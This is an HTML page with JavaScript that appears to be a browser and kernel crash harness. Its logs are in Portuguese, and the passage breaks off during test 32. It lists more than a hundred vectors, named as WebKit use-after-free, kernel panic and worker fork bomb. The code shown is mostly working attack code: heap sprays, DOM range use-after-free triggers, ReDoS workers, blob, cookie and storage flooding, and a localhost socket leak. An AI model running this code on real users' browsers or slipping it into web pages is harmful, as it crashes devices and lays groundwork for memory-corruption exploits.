<button onclick="runTest388()">388. BLOB URL XHR REVOCATION LOOP</button>
<button onclick="runTest389()">389. LOCALSTORAGE SYNC WRITE HISTORY RACE</button>
<button onclick="runTest390()">390. THE FINAL DESYNC (ALL VECTORS)</button>
<button onclick="runTest391()">391. TRANSFER LIST PROXY GETTER UAF</button>
<button onclick="runTest392()">392. IFRAME DOCUMENT OPEN HISTORY RACE</button>
<button onclick="runTest393()">393. TREE WALKER MUTATION REMOVAL TRAP</button>
<button onclick="runTest394()">394. REGEXP SUBCLASS LASTINDEX SIDE-EFFECT</button>
<button onclick="runTest395()">395. TYPEDARRAY SET OVERLAPPING BUFFER DETACH</button>
<button onclick="runTest396()">396. CRYPTO WORKER BUFFER ALIGNMENT KILL</button>
<button onclick="runTest397()">397. INDEXEDDB VERSION CHANGE HANDLE LOCK</button>
<button onclick="runTest398()">398. VIDEO TRACK CUE RENDERER FLUSH</button>
<button onclick="runTest399()">399. XHR SYNC BLOB DESCRIPTOR EXHAUSTION</button>
<button onclick="runTest400()">400. THE OMEGA ENDGAME (STATE COLLAPSE)</button>
<button onclick="runTest401()">401. MESSAGE PORT TRANSFER PROXY REENTRANCY</button>
<button onclick="runTest402()">402. RESIZE OBSERVER DETACHED NODE WALKER</button>
<button onclick="runTest403()">403. HISTORY STATE GETTER NAVIGATION RACE</button>
<button onclick="runTest404()">404. REGEXP EXEC LASTINDEX SIDE-EFFECT LOOP</button>
<button onclick="runTest405()">405. ARRAY BUFFER VIEW LENGTH REDUCTION TRAP</button>
<button onclick="runTest406()">406. CRYPTO WORKER TERMINATE BUFFER RACE</button>
<button onclick="runTest407()">407. INDEXEDDB UPGRADE BLOCKED TRANSACTION KILL</button>
<button onclick="runTest408()">408. FULLSCREEN VIDEO TEXT TRACK FLUSH</button>
<button onclick="runTest409()">409. XHR SYNC BLOB DESCRIPTOR REVOCATION</button>
<button onclick="runTest410()">410. THE KERNEL COLLAPSE (ASYNC STORM)</button>
<button onclick="runTest411()">411. TYPEDARRAY SPECIES OVERFLOW TRAP</button>
<button onclick="runTest412()">412. MESSAGE PORT CLOSE TRANSFER RACE</button>
<button onclick="runTest413()">413. TREE WALKER FILTER NODE REMOVAL</button>
<button onclick="runTest414()">414. REGEXP COMPILE SIDE-EFFECT CRASH</button>
<button onclick="runTest415()">415. HISTORY STATE CYCLIC PROXY BOMB</button>
<button onclick="runTest416()">416. CRYPTO THREAD MEMORY UNMAP RACE</button>
<button onclick="runTest417()">417. INDEXEDDB VERSION BLOCKED KILL</button>
<button onclick="runTest418()">418. VIDEO TRACK CUE RENDERER PANIC</button>
<button onclick="runTest419()">419. BLOB FILE DESCRIPTOR EXHAUSTION</button>
<button onclick="runTest420()">420. THE SYSTEM FRACTURE (ALL VECTORS)</button>
<button onclick="runTest421()">421. WebKit: Crypto API Detached Buffer Race</button>
<button onclick="runTest422()">422. WebKit: ResizeObserver DOM Node Removal UAF</button>
<button onclick="runTest423()">423. WebKit: History State Getter Side-Effect Corruption</button>
<button onclick="runTest424()">424. WebKit: Range Extraction vs NodeIterator Mutator</button>
<button onclick="runTest425()">425. WebKit: TypedArray Constructor Species Confusion</button>
<button onclick="runTest426()">426. Kernel: Circular MessagePort Ring Refcount Panic</button>
<button onclick="runTest427()">427. Kernel: LocalStorage IPC Broadcast vs Frame Kill</button>
<button onclick="runTest428()">428. Kernel: Blob VFS Handle Revoke/Fetch Race</button>
<button onclick="runTest429()">429. Kernel: Deep Nested Port Transfer Stack Overflow</button>
<button onclick="runTest430()">430. Kernel: FileReader Slice Descriptor Exhaustion</button>
<button onclick="runTest431()">431. WebKit: History State + DOM Tree Depth Thrashing</button>
<button onclick="runTest432()">432. WebKit: Worker TypedArray Detach & Access Race</button>
<button onclick="runTest433()">433. WebKit: TreeWalker MutationObserver UAF</button>
<button onclick="runTest434()">434. WebKit: Large DataView Misalignment GC Pressure</button>
<button onclick="runTest435()">435. WebKit: Blob URL Fetch Revocation Time-of-Check</button>
<button onclick="runTest436()">436. Kernel: IPC Port Ring Refcount Overflow Panic</button>
<button onclick="runTest437()">437. Kernel: File Descriptor Exhaustion via Slice Flood</button>
<button onclick="runTest438()">438. Kernel: BroadcastChannel & Storage Event Storm</button>
<button onclick="runTest439()">439. Kernel: Nested Worker Fork Bomb Scheduler Panic</button>
<button onclick="runTest440()">440. Kernel: Pipe Buffer Overflow Zombie Process Transfer</button>
<button onclick="runTest441()">441. WebKit: MutationObserver vs Range Extract UAF</button>
<button onclick="runTest442()">442. WebKit: Array.sort Buffer Detach Race</button>
<button onclick="runTest443()">443. WebKit: Prototype Poisoning vs JSON.parse</button>
<button onclick="runTest444()">444. WebKit: AdoptNode Cross-Document Cycle</button>
<button onclick="runTest445()">445. WebKit: TextDecoder Stream State Corruption</button>
<button onclick="runTest446()">446. Kernel: IPC Ring Topology Refcount Panic</button>
<button onclick="runTest447()">447. Kernel: Blob VFS Fetch-Revoke-Terminate Race</button>
<button onclick="runTest448()">448. Kernel: Storage Event vs BroadcastChannel Storm</button>
<button onclick="runTest449()">449. Kernel: FileReader Descriptor & Slice Exhaustion</button>
<button onclick="runTest450()">450. Kernel: Deep History State Serialization Overflow</button>
<button onclick="runTest451()">451. WebKit: Worker Buffer Detach & Property Access Race</button>
<button onclick="runTest452()">452. WebKit: NodeIterator DOM Mutation & GC Collapse</button>
<button onclick="runTest453()">453. WebKit: History State Object Cyclical Ref UAF</button>
<button onclick="runTest454()">454. WebKit: DataView Misalignment vs ArrayBuffer Neuter</button>
<button onclick="runTest455()">455. WebKit: Blob URL Iframe Navigation & Revoke Race</button>
<button onclick="runTest456()">456. Kernel: MessagePort Deep Chain Refcount Panic</button>
<button onclick="runTest457()">457. Kernel: BroadcastChannel & Storage Event List Corruption</button>
<button onclick="runTest458()">458. Kernel: File Descriptor Table Exhaustion & Slice Race</button>
<button onclick="runTest459()">459. Kernel: IPC Pipe Buffer Overflow Zombie Transfer</button>
<button onclick="runTest460()">460. Kernel: Recursive Worker Scheduler Cleanup Race</button>
<button onclick="runTest461()">461. WebKit: TextEncoder EncodeInto vs Buffer Detach Race</button>
<button onclick="runTest462()">462. WebKit: RegExp Exec Side-Effect Memory Corruption</button>
<button onclick="runTest463()">463. WebKit: TreeWalker AcceptNode DOM Mutation UAF</button>
<button onclick="runTest464()">464. WebKit: HTMLMediaElement TextTrack Cue List Poisoning</button>
<button onclick="runTest465()">465. WebKit: Selection API Range Collapse vs Node Removal</button>
<button onclick="runTest466()">466. Kernel: Blob Slice Recursion Depth Exhaustion</button>
<button onclick="runTest467()">467. Kernel: XHR Socket Handle Leak & Localhost Flood</button>
<button onclick="runTest468()">468. Kernel: MessagePort Queue Transfer to Zombie Thread</button>
<button onclick="runTest469()">469. Kernel: History State Deep Clone Kernel Stack Overflow</button>
<button onclick="runTest470()">470. Kernel: VFS Lookup Race via Worker Fetch & Revoke</button>
<button onclick="runTest471()">471. WebKit: IntersectionObserver Node Removal UAF</button>
<button onclick="runTest472()">472. WebKit: Worker Transfer ArrayBuffer Getter Race</button>
<button onclick="runTest473()">473. WebKit: Range Boundary SplitText Mutation Race</button>
<button onclick="runTest474()">474. WebKit: Canvas2D Zero-Size Pattern Heap Corruption</button>
<button onclick="runTest475()">475. WebKit: Crypto API Detached Buffer Syscall</button>
<button onclick="runTest476()">476. Kernel: Recursive Port Object Serialization Stack Overflow</button>
<button onclick="runTest477()">477. Kernel: Blob Slice Chain VFS Recursion Exhaustion</button>
<button onclick="runTest478()">478. Kernel: BroadcastChannel Navigation Destruction Race</button>
<button onclick="runTest479()">479. Kernel: History State Large Allocation Paging Stress</button>
<button onclick="runTest480()">480. Kernel: XHR Blob URL Abort-Revoke Race</button>
<button onclick="runTest481()">481. WebKit: SVG Use Element Shadow Tree UAF</button>
<button onclick="runTest482()">482. WebKit: Document.open() Recursive Lifecycle Race</button>
<button onclick="runTest483()">483. WebKit: TextTrackCueList Sort Order Corruption</button>
<button onclick="runTest484()">484. WebKit: Map Iterator Side-Effect Invalidator</button>
<button onclick="runTest485()">485. WebKit: Huge String Rope Flattening OOM</button>
<button onclick="runTest486()">486. Kernel: VM Map Entry Split/Merge Race (Transfer)</button>
<button onclick="runTest487()">487. Kernel: Socket Buffer Upload vs Blob Revocation</button>
<button onclick="runTest488()">488. Kernel: Port Entanglement Cannibalism</button>
<button onclick="runTest489()">489. Kernel: Iframe Navigation Storm vs Vnode Lock</button>
<button onclick="runTest490()">490. Kernel: Thread Signal Handling Stress (Worker Bomb)</button>
<button onclick="runTest491()">491. WebKit: Map Iterator Invalidation UAF</button>
<button onclick="runTest492()">492. WebKit: Range Boundary SplitText Mutation Race</button>
<button onclick="runTest493()">493. WebKit: MessagePort Transfer & Close Race</button>
<button onclick="runTest494()">494. WebKit: HTMLMediaElement TextTrack List Poisoning</button>
<button onclick="runTest495()">495. WebKit: DocumentFragment Insertion Mutation UAF</button>
<button onclick="runTest496()">496. Kernel: Blob VFS Lookup vs Revoke vs Thread Kill</button>
<button onclick="runTest497()">497. Kernel: IPC Port Ring Refcount Underflow</button>
<button onclick="runTest498()">498. Kernel: BroadcastChannel Navigation Storm</button>
<button onclick="runTest499()">499. Kernel: History State Paging Exhaustion</button>
<button onclick="runTest500()">500. Kernel: XHR Blob URL Abort-Revoke Race</button>


<hr>
<h3>SYSTEM LOG</h3>
<div id="logger" style="border:1px solid #000; width:95%; height:300px; overflow:scroll; font-family:monospace;">
    [READY] Sistema aguardando injeção de vetores...
</div>

<script>
function log(msg) {
    var l = document.getElementById('logger');
    var d = new Date();
    var time = d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds() + "." + d.getMilliseconds();
    l.innerHTML = "[" + time + "] " + msg + "<br>" + l.innerHTML;
}

function runTest01() {
    log("Iniciando Teste 01 (DOM UAF)...");
    var root = document.createElement('div');
    var nodes = [];
    var trash = [];
    document.body.appendChild(root);
    for(var i=0; i<400; i++) {
        var el = document.createElement('div');
        el.id = 'n' + i;
        var s = document.createElement('span');
        s.textContent = "A".repeat(255); 
        el.appendChild(s);
        root.appendChild(el);
        nodes.push(el);
    }
    function walker() {
        var range = document.createRange();
        range.selectNodeContents(root);
        range.deleteContents(); 
        for(var j=0; j<150; j++) {
            if(nodes[j]) {
                trash.push(nodes[j]);
                nodes[j] = null;
                try { 
                    var x = trash[trash.length-1].firstChild.textContent;
                    var y = trash[trash.length-1].nextSibling;
                } catch(e){}
            }
        }
    }
    root.addEventListener('DOMNodeRemoved', function() {
        walker();
        var heavy = new Uint32Array(0x2000).fill(0x41414141);
        var spray = [];
        for(let k=0; k<100; k++) spray.push(new ArrayBuffer(64));
    });
    document.body.removeChild(root);
    log(">> T01 Concluído: Vetor DOM executado. Verifique estabilidade.");
}

function runTest02() {
    log("Iniciando Teste 02 (TextDecoder)...");
    var decoder = new TextDecoder('utf-8', {fatal: false});
    var spray = [];
    var buffer = new Uint8Array(1024 * 1024 * 4); 
    for(var i=0; i<buffer.length; i++) buffer[i] = (i % 2 === 0) ? 0xC0 : 0x80;
    
    try {
        for(var k=0; k<100; k++) {
            var chunk = buffer.subarray(k * 2000, (k+1) * 2000);
            var str = decoder.decode(chunk, {stream: true});
            spray.push(str + "X".repeat(0xFF)); 
            if(k % 20 === 0) { spray = []; }
        }
        var massive = decoder.decode(buffer); 
        log(">> T02 Sucesso: Decoded Len: " + massive.length);
    } catch(e) {
        log(">> T02 Falha: " + e.message);
    }
}

function runTest03() {
    log("Iniciando Teste 03 (Proxy Recursion)...");
    var target = {};
    var p = new Proxy(target, {
        get: function(obj, prop) {
            if (prop === 'xyz') return 1;
            var junk = {a: 1, b: "B".repeat(128), c: new Uint8Array(32)};
            return obj[prop] + p[prop]; 
        }
    });
    try {
        Object.prototype.temp = p;
        var r = p.anyProp; 
    } catch(e) {
        var arr = [];
        for(var i=0; i<20000; i++) arr.push({x: p, y: new Uint32Array(16)});
        log(">> T03 Concluído: Stack Depth Limit Atingido.");
    }
}

function runTest04() {
    log("Iniciando Teste 04 (SVG Type Conf)...");
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var path = document.createElementNS("http://www.w3.org/2000/svg", "path");
    svg.appendChild(path);
    document.body.appendChild(svg);
    var list = [];
    for(var i=0; i<0x400; i++) {
        var o = { 
            toString: function() { 
                path.parentNode.removeChild(path); 
                var fill = new Array(100).fill(1.1);
                return "M10 10"; 
            } 
        };
        list.push(o);
    }
    try {
        path.setAttribute("d", list[100]);
        var point = svg.createSVGPoint();
        point.matrixTransform(svg.getScreenCTM());
    } catch(e) {}
    log(">> T04 Concluído: SVG Casting forçado.");
}

function runTest05() {
    log("Iniciando Teste 05 (Array Sort)...");
    var arr = new Array(4000);
    for(var i=0; i<arr.length; i++) arr[i] = i;
    arr[0] = 1.1;
    arr.sort(function(a, b) {
        if (a === 200) {
            arr.length = 1; 
            var spray = [];
            for(var k=0; k<10000; k++) spray.push(new Uint32Array(64).fill(0x13371337));
            return 0;
        }
        return a - b;
    });
    log(">> T05 Concluído: Array length pós-sort: " + arr.length);
}

function runTest06() {
    log("Iniciando Teste 06 (Kernel Heap Spray)...");
    var ab = new ArrayBuffer(0x20000); 
    var u32 = new Uint32Array(ab);
    var targetArrays = [];
    for(var i=0; i<8000; i++) {
        var size = (i % 4 === 0) ? 0x200 : 0x8000; 
        targetArrays.push(new Uint8Array(size));
        targetArrays[i].fill(0x41);
    }
    for(var i=0; i<targetArrays.length; i+=2) {
        targetArrays[i] = null;
    }
    var fillers = [];
    for(var j=0; j<4000; j++) {
        var f = new Float64Array(32); 
        f[0] = 1.61803398875e-300; 
        fillers.push(f);
    }
    log(">> T06 Concluído: Memória fragmentada e preenchida.");
}

function runTest07() {
    log("Iniciando Teste 07 (IPC Storm)...");
    var ports = [];
    var channelCount = 0;
    function sprayIPC() {
        try {
            for(var i=0; i<1000; i++) {
                var mc = new MessageChannel();
                ports.push(mc.port1);
                mc.port2.postMessage("ping", [mc.port2]); 
                channelCount++;
            }
            if(channelCount < 25000) {
                setTimeout(sprayIPC, 5);
            } else {
                for(var p of ports) p.close();
                log(">> T07 Concluído: Handles esgotados e fechados.");
            }
        } catch(e) { log(">> T07 Erro: " + e); }
    }
    sprayIPC();
}

function runTest08() {
    log("Iniciando Teste 08 (Regex DoS)...");
    var pattern = "((a*)+)+b"; 
    var str = "a".repeat(5000); 
    var blob = new Blob(["onmessage=function(e){ var r = new RegExp('((a*)+)+b'); r.exec(e.data); }"], {type: "application/javascript"});
    for(var i=0; i<12; i++) { 
        var w = new Worker(URL.createObjectURL(blob));
        w.postMessage(str);
    }
    log(">> T08 Enviado: 12 Workers lançados (Possível Freeze).");
}

function runTest09() {
    log("Iniciando Teste 09 (Blob Flood)...");
    var urls = [];
    var data = new Uint8Array(1024*1024*2).fill(0x90); 
    var loop = setInterval(function() {
        for(var i=0; i<100; i++) {
            var b = new Blob([data], {type: "application/octet-stream"});
            var u = URL.createObjectURL(b);
            urls.push(u);
            if(urls.length > 3000) {
                URL.revokeObjectURL(urls.shift());
                var junk = new Array(2000).join('x');
            }
        }
        if(urls.length % 1000 == 0) log(".. URLs ativas: " + urls.length);
        
        if(urls.length > 50000) {
            clearInterval(loop);
            log(">> T09 Concluído: Flood finalizado.");
        }
    }, 20);
}

function runTest10() {
    log("Iniciando Teste 10 (GPU OOM)...");
    var canvases = [];
    try {
        for(var i=0; i<1000; i++) {
            var c = document.createElement('canvas');
            c.width = 4096 - (i % 100); 
            c.height = 2048 + (i % 100);
            var ctx = c.getContext('2d');
            if(ctx) {
                var imgData = ctx.createImageData(200, 200);
                for(var j=0; j<imgData.data.length; j+=4) imgData.data[j] = 255;
                ctx.putImageData(imgData, 0, 0);
                canvases.push(c);
            }
        }
    } catch(e) {
        canvases = null;
        log(">> T10 Critical: GPU OOM Triggered.");
    }
    if(canvases) log(">> T10 Info: Alocados " + canvases.length + " canvases.");
}
function runTest11() {
    log("Iniciando T11: XHR Sync Race...");
    var pool = [];
    var running = true;
    try {
        for(var i=0; i<50; i++) {
            var x = new XMLHttpRequest();
            pool.push(x);
            x.onreadystatechange = function() {
                if(this.readyState == 4 && running) {
                    var s = document.createElement('script');
                    s.textContent = 'var ' + 'v'.repeat(100) + ' = ' + Date.now();
                    document.body.appendChild(s);
                    document.body.removeChild(s);
                    this.open("GET", window.location.href, false);
                    try { this.send(); } catch(e){}
                }
            };
        }
        pool.forEach(function(xhr) {
            xhr.open("GET", "/", true);
            xhr.send();
        });
        setTimeout(function(){ running = false; log(">> T11: XHR Loop Parado"); }, 3000);
    } catch(e) { log(">> T11 Erro: " + e.message); }
}

function runTest12() {
    log("Iniciando T12: JSON Deep Nesting...");
    var depth = 8000;
    var jsonStr = '{"a":';
    for(var i=0; i<depth; i++) jsonStr += '{"b":';
    jsonStr += '1';
    for(var i=0; i<depth; i++) jsonStr += '}';
    jsonStr += '}';
    try {
        var t0 = performance.now();
        var obj = JSON.parse(jsonStr);
        var spray = new Array(1000).fill(obj);
        log(">> T12: Parse OK (" + (performance.now()-t0).toFixed(2) + "ms). Objects created.");
    } catch(e) {
        var junk = new Uint32Array(0x10000);
        junk.fill(0xDEADBEEF);
        log(">> T12 Exception (Stack Overflow?): " + e.message);
    }
}

function runTest13() {
    log("Iniciando T13: Intl Locale Stress...");
    var locales = ['en-US', 'ar-SA', 'zh-CN', 'ja-JP', 'ru-RU', 'th-TH'];
    var storage = [];
    try {
        for(var i=0; i<2000; i++) {
            var loc = locales[i % locales.length];
            var opt = { 
                style: 'currency', 
                currency: 'USD', 
                currencyDisplay: i % 2 == 0 ? 'symbol' : 'name',
                maximumSignificantDigits: 20
            };
            var nf = new Intl.NumberFormat(loc, opt);
            var res = nf.format(123456.789);
            if(i % 50 === 0) {
                storage.push({formatter: nf, result: res + "A".repeat(255)});
            }
        }
        log(">> T13: Intl Objects: " + storage.length);
    } catch(e) { log(">> T13 Erro: " + e); }
}

function runTest14() {
    log("Iniciando T14: Range Detach UAF...");
    var p = document.createElement('p');
    p.innerHTML = "<b>bold</b><span>text</span><i>italic</i>";
    document.body.appendChild(p);
    var r = document.createRange();
    r.setStart(p.firstChild, 0);
    r.setEnd(p.lastChild, 1);
    var iterations = 0;
    
    var i = setInterval(function() {
        iterations++;
        r.deleteContents();
        p.innerHTML = "<b>R" + iterations + "</b>";
        r.setStart(p.firstChild, 0);
        var f = document.createDocumentFragment();
        f.appendChild(document.createElement('div'));
        r.insertNode(f);
        
        if(iterations > 500) {
            clearInterval(i);
            document.body.removeChild(p);
            log(">> T14: Range manipulation concluída.");
        }
    }, 5);
}

function runTest15() {
    log("Iniciando T15: Event Dispatch Flood...");
    var target = document.createElement('div');
    var count = 0;
    var handler = function(e) {
        count++;
        if(count % 100 === 0) {
            var heavy = new Uint8Array(0x1000).fill(count);
        }
        if(count < 5000) {
            target.dispatchEvent(new Event('customevent'));
        }
    };
    target.addEventListener('customevent', handler);
    try {
        target.dispatchEvent(new Event('customevent'));
        log(">> T15: Events dispatched: " + count);
    } catch(e) {
        log(">> T15 Stack Limit: " + e.message);
    }
}

function runTest16() {
    log("Iniciando T16: FileReader Resource Leak...");
    var readers = [];
    var blobData = new Uint8Array(1024*50).fill(65);
    var blob = new Blob([blobData]);
    
    var interval = setInterval(function() {
        for(var i=0; i<20; i++) {
            var fr = new FileReader();
            fr.readAsDataURL(blob);
            readers.push(fr);
        }
        if(readers.length > 2000) {
            // Não limpamos o array intencionalmente para segurar handles
            log(">> T16: Active Readers: " + readers.length + " (Leaking handles)");
            if(readers.length > 8000) clearInterval(interval);
        }
    }, 50);
}

function runTest17() {
    log("Iniciando T17: Buffer Aliasing...");
    var ab = new ArrayBuffer(0x100000); 
    var view1 = new Uint8Array(ab);
    var view2 = new Float64Array(ab);
    var view3 = new DataView(ab);
    
    try {
        for(var i=0; i<view2.length; i++) {
            view2[i] = 1.23456789e+100; 
            if(i % 1000 === 0) {
                var check = view3.getUint8(i*8);
                view1[i*8] = check ^ 0xFF; 
            }
        }
        var complex = [];
        for(var k=0; k<1000; k++) complex.push(ab.slice(k*100, (k+1)*100));
        log(">> T17: Buffer manipulado via múltiplas views.");
    } catch(e) { log(">> T17 Erro: " + e); }
}

function runTest18() {
    log("Iniciando T18: History State OOM...");
    var stateObj = { data: "X".repeat(1024*10) }; 
    var count = 0;
    var t = setInterval(function() {
        try {
            history.pushState(stateObj, "Page " + count, "?p=" + count);
            count++;
            if(count % 500 === 0) log(".. History length: " + history.length);
        } catch(e) {
            clearInterval(t);
            log(">> T18 Erro/Limite: " + e.message);
        }
        if(count > 10000) clearInterval(t);
    }, 1);
}

function runTest19() {
    log("Iniciando T19: Storage Quota DoS...");
    localStorage.clear();
    var chunk = "A".repeat(1024 * 100); 
    var keys = [];
    try {
        for(var i=0; i<1000; i++) {
            var key = "k" + i;
            localStorage.setItem(key, chunk);
            keys.push(key);
        }
    } catch(e) {
        log(">> T19 Quota Atingida: " + e.message);
        try {
            var huge = new Array(keys.length).fill(chunk);
            localStorage.setItem("killer", huge.join('')); 
        } catch(z) {}
    }
    log(">> T19: Itens gravados: " + keys.length);
}

function runTest20() {
    log("Iniciando T20: Iframe Churn Panic...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var frames = 0;
    
    var loop = setInterval(function() {
        for(var i=0; i<10; i++) {
            var ifr = document.createElement('iframe');
            container.appendChild(ifr);
            try {
                var d = ifr.contentDocument;
                d.open();
                d.write("<html><body>" + "<div></div>".repeat(100) + "</body></html>");
                d.close();
            } catch(e){}
            
            if(frames % 3 === 0) {
                container.removeChild(container.firstChild);
            }
            frames++;
        }
        if(frames % 200 === 0) log(".. Frames processados: " + frames);
        
        if(frames > 3000) {
            clearInterval(loop);
            log(">> T20: Churn finalizado.");
        }
    }, 50);
}
function runTest21() {
    log("Iniciando T21: Selection API Use-After-Free...");
    var sel = window.getSelection();
    var range = document.createRange();
    var div = document.createElement('div');
    div.innerHTML = "<span>A</span><span>B</span><span>C</span>";
    document.body.appendChild(div);
    range.selectNode(div.firstChild);
    sel.addRange(range);
    
    try {
        for(var i=0; i<100; i++) {
            var f = document.createDocumentFragment();
            f.appendChild(document.createElement('b'));
            range.insertNode(f);
            sel.extend(div.lastChild, 0);
            
            if(i % 10 === 0) {
                div.innerHTML = ""; 
                var junk = new Uint32Array(1024).fill(0x13371337);
            }
            sel.removeAllRanges();
            sel.addRange(range);
        }
    } catch(e) {
        log(">> T21 Exception: " + e.message);
    }
    document.body.removeChild(div);
    log(">> T21 Finalizado: Selection/Range Stress.");
}

function runTest22() {
    log("Iniciando T22: Map Iterator Invalidation...");
    var m = new Map();
    for(var i=0; i<1000; i++) m.set(i, {id: i, buffer: new Uint8Array(64)});
    var iter = m.entries();
    var steps = 0;
    
    try {
        var item;
        while(!(item = iter.next()).done) {
            steps++;
            if(steps % 50 === 0) {
                for(var j=0; j<100; j++) m.delete(steps + j);
                for(var k=0; k<200; k++) m.set("n"+k, new ArrayBuffer(128));
                
                var spray = []; 
                for(var x=0; x<50; x++) spray.push({a:1, b:item.value});
            }
            if(steps > 5000) break;
        }
        log(">> T22 Iterator: Steps processed " + steps);
    } catch(e) {
        log(">> T22 Crash Logic: " + e.message);
    }
}

function runTest23() {
    log("Iniciando T23: Rope String Flattening...");
    var s = "Root";
    var rope = [];
    var parts = ["A", "B", "C", "D"];
    
    try {
        for(var i=0; i<20000; i++) {
            s += parts[i % 4] + i; 
        }
        rope.push(s);
        
        var s2 = s.substring(100, 20000); 
        var s3 = s2.toUpperCase(); 
        
        var trigger = s3.indexOf("C100"); 
        
        if(trigger > -1) {
            var atom = s.substring(0, 10); 
            var memory = new Uint8Array(1024*1024*5); 
            log(">> T23 Rope: String flattened & searched. Len: " + s.length);
        }
    } catch(e) { log(">> T23 Erro: " + e); }
}

function runTest24() {
    log("Iniciando T24: AudioTrackList Race...");
    var v = document.createElement('video');
    var store = [];
    
    var t = setInterval(function() {
        if(v.audioTracks) { 
            log(">> T24: AudioTracks API presente.");
            // Lógica específica se a API existir
        } else {
            // Fallback para elementos de áudio padrão
            for(var i=0; i<50; i++) {
                var a = new Audio();
                a.src = "dummy" + i + ".mp3";
                store.push(a);
                a.onloadedmetadata = function() {
                    this.src = ""; 
                    store.shift(); 
                };
            }
        }
        
        if(store.length > 500) {
            store = []; 
            var heavy = new Float64Array(10000).fill(1.23);
        }
        
        if(store.length > 2000) clearInterval(t);
    }, 50);
    setTimeout(function(){ clearInterval(t); log(">> T24 Concluído (Race Attempt)."); }, 2000);
}

function runTest25() {
    log("Iniciando T25: HTMLCollection NamedItem...");
    var form = document.createElement('form');
    document.body.appendChild(form);
    var names = ["id", "name", "toString", "length", "item", "namedItem"];
    
    try {
        for(var i=0; i<1000; i++) {
            var input = document.createElement('input');
            input.setAttribute('name', names[i % names.length]);
            input.setAttribute('id', 'val' + i);
            form.appendChild(input);
        }
        
        var collision = form.elements['toString']; 
        var len = form.elements['length']; 
        
        form.innerHTML = ""; 
        var spray = new Array(500).fill(1.1);
        
        log(">> T25: Element lookup stress performed.");
    } catch(e) { log(">> T25 Erro: " + e); }
    document.body.removeChild(form);
}

function runTest26() {
    log("Iniciando T26: Timer Heap Flood...");
    var timers = [];
    var count = 0;
    
    function recursiveTimer() {
        count++;
        var t = setTimeout(function() {
            var x = new Uint8Array(1024); 
            if(count % 2 === 0) recursiveTimer();
        }, 10 + (count % 50));
        timers.push(t);
        
        if(timers.length > 5000) {
            timers.splice(0, 1000).forEach(clearTimeout); 
        }
    }
    
    for(var i=0; i<100; i++) recursiveTimer();
    
    setTimeout(function() {
        timers.forEach(clearTimeout);
        log(">> T26: Timers active max: " + count);
    }, 3000);
}

function runTest27() {
    log("Iniciando T27: Canvas Path Vertex OOM...");
    var c = document.createElement('canvas');
    c.width = 2048; c.height = 2048;
    var ctx = c.getContext('2d');
    
    if(ctx) {
        ctx.beginPath();
        try {
            for(var i=0; i<50000; i++) {
                ctx.moveTo(Math.random()*2000, Math.random()*2000);
                ctx.lineTo(Math.random()*2000, Math.random()*2000);
                ctx.bezierCurveTo(i, i, i+10, i+10, 500, 500);
                
                if(i % 10000 === 0) {
                    var data = ctx.getImageData(0,0,10,10); 
                    log(".. Path vertices: " + i);
                }
            }
            ctx.fill(); 
        } catch(e) {
            log(">> T27 GPU Panic: " + e.message);
        }
    }
    log(">> T27: Complex path render sent.");
}

function runTest28() {
    log("Iniciando T28: Cookie Buffer Overflow...");
    var base = "val=" + "B".repeat(4000) + "; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT;";
    var count = 0;
    
    try {
        var t = setInterval(function() {
            document.cookie = "id" + count + "=" + base;
            count++;
            
            if(count % 50 === 0) {
                var c = document.cookie; 
                if(c.length > 50000) {
                    var all = document.cookie.split(';');
                    for(var i=0; i<all.length; i++) {
                        document.cookie = all[i] + "; expires=Thu, 01 Jan 1970 00:00:00 GMT";
                    }
                }
            }
            if(count > 500) {
                clearInterval(t);
                log(">> T28: Cookie flood stop. Total ops: " + count);
            }
        }, 5);
    } catch(e) { log(">> T28 Erro: " + e); }
}

function runTest29() {
    log("Iniciando T29: Attribute Node Exhaustion...");
    var el = document.createElement('div');
    var attrs = [];
    
    try {
        for(var i=0; i<15000; i++) {
            var name = "data-val-" + i;
            var val = "x".repeat(50); 
            el.setAttribute(name, val);
            attrs.push(name);
        }
        
        var clone = el.cloneNode(true); 
        document.body.appendChild(clone);
        
        var junk = clone.outerHTML.length; 
        document.body.removeChild(clone);
        log(">> T29: Attributes set: " + attrs.length);
        
    } catch(e) {
        log(">> T29 Resource Limit: " + e.message);
    }
}

function runTest30() {
    log("Iniciando T30: Socket Leak (Img Src)...");
    var imgs = [];
    var portStart = 30000;
    
    var loop = setInterval(function() {
        for(var i=0; i<20; i++) {
            var img = new Image();
            // Tenta conectar em IPs/Portas que seguram a conexão (SYN_SENT) ou falham lentamente
            img.src = "http://127.0.0.1:" + (portStart + i) + "/junk"; 
            imgs.push(img);
        }
        portStart += 20;
        
        if(imgs.length > 1000) {
            // Drop references without aborting via src="" to keep kernel socket open
            imgs = []; 
            imgs.length = 0;
        }
        
        if(portStart > 32000) {
            clearInterval(loop);
            log(">> T30: Socket flood finished.");
        }
    }, 50);
}
function runTest31() {
    log("Iniciando T31: XSLT Processor Recursion...");
    var xmlString = "<root>" + "<a>data</a>".repeat(100) + "</root>";
    var xslString = '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">';
    xslString += '<xsl:for-each select="//a"><xsl:copy-of select="."/></xsl:for-each>';
    xslString += '</xsl:template></xsl:stylesheet>';
    
    try {
        var parser = new DOMParser();
        var xml = parser.parseFromString(xmlString, "text/xml");
        var xsl = parser.parseFromString(xslString, "text/xml");
        var processor = new XSLTProcessor();
        processor.importStylesheet(xsl);
        
        var f = document.createDocumentFragment();
        for(var i=0; i<500; i++) {
            var res = processor.transformToFragment(xml, document);
            f.appendChild(res);
            if(i % 100 === 0) {
                var spray = new Array(200).fill(1.1); 
            }
        }
        log(">> T31: XSLT Operations completed.");
    } catch(e) { log(">> T31 Erro: " + e.message); }
}

function runTest32() {
    log("Iniciando T32: MutationObserver Infinite Loop...");
    var target = document.createElement('div');
    document.body.appendChild(target);
    var count = 0;
    
    var obs = new MutationObserver(function(mutations) {
        count++;
        mutations.forEach(function(m) {
            var leak = document.createElement('span');
            leak.textContent = "L".repeat(100); 
            if(count < 2000) {
                target.setAttribute('data-x', count);
                target.appendChild(leak);
            }
        });
    });
    
    obs.observe(target, { attributes: true, childList: true, subtree: true });
    target.setAttribute('data-x', 'start');
    
    setTimeout(function() {
        obs.disconnect();
        target.innerHTML = "";
        document.body.removeChild(target);
        log(">> T32: Observer triggers triggered: " + count);
